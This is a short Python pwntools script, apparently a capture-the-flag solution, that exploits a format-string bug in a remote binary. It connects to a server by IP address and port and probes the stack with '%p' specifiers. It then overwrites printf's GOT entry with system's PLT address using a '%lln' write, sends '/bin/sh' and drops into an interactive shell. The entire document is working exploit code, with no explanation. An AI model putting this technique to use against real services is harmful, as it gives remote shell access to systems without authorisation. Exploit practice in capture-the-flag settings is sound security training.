from pwn import *
context(arch="amd64",os="linux",log_level="debug")

p=remote("159.138.137.79",61859)
elf=ELF("./pwn")

system_plt =elf.plt["system"]
printf_got = elf.got["printf"]

p.sendlineafter("battle \n","2")
payload="A"*8+".%p"*50

payload="a%"+str(system_plt-1)+"c%8$lln"+p64(printf_got)
p.sendline(payload)
p.sendlineafter("battle \n","2")
p.sendline("/bin/sh\x00")
p.interactive()
